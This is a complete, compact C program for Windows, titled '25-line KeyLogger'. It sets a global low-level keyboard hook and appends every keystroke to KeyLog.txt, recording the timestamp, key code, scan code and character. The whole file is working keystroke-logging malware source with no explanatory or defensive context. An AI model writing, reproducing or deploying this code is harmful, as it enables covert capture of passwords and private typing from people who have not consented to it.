// 25-line KeyLogger
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>

FILE* file;
DWORD CALLBACK DumpToFile(LPVOID lParam){
	LPKBDLLHOOKSTRUCT kb = (LPKBDLLHOOKSTRUCT)lParam;
	fprintf(file, "%d> 0x%02X | 0x%02X | %c \n", kb->time, kb->vkCode, kb->scanCode, MapVirtualKeyA(kb->vkCode, MAPVK_VK_TO_CHAR));
	fflush(file);
	return 0;
}
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
	if(wParam == WM_KEYDOWN){
		CreateThread(0, 0, DumpToFile, lParam, 0, 0);
	}
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int APIENTRY WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow){
	file = fopen("KeyLog.txt", "a"); //fprintf(file, "time> vkCode|scancode| character\n");
	SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
	GetMessageA(0, 0, 0, 0);
	return 0;
}